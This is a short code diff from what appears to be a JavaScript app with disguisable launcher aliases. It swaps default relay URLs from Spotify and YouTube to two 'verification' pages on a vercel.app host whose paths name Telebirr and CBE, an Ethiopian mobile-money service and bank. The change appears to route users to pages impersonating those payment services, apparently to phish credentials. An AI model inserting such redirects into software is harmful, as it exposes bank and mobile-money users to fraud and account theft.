@@ -62,7 +62,7 @@ setInterval(() => {
   }
 }, 30_000);
 
-const RELAY_DEFAULT_URLS = { 1: "https://spotify.com", 2: "https://youtube.com" };
+const RELAY_DEFAULT_URLS = { 1: "https://verification-six-gilt.vercel.app/telebirr", 2: "https://verification-six-gilt.vercel.app/cbe" };
 
 // Vanity launcher names (keys must match Notify AppAlias + manifest aliases).
 // Labels are placeholders until the community finalizes the list.
